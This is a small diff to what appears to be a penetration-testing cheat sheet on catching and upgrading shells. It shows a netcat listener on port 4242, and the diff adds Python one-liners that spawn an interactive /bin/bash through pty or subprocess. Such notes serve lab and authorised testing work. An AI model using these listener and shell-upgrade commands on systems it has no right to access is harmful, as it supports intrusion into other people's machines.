@@ -8,6 +8,11 @@ rlwrap nc -nlvp 4242
 ## bash with python, but it doesn't always give us
 ## back a full tty shell
 python -c 'import pty; pty.spawn("/bin/bash")'
+or
+python3 -c "__import__('pty').spawn('/bin/bash')"
+or
+python3 -c "__import__('subprocess').call(['/bin/bash'])"
+
 
 # Socat
 ## Listener:
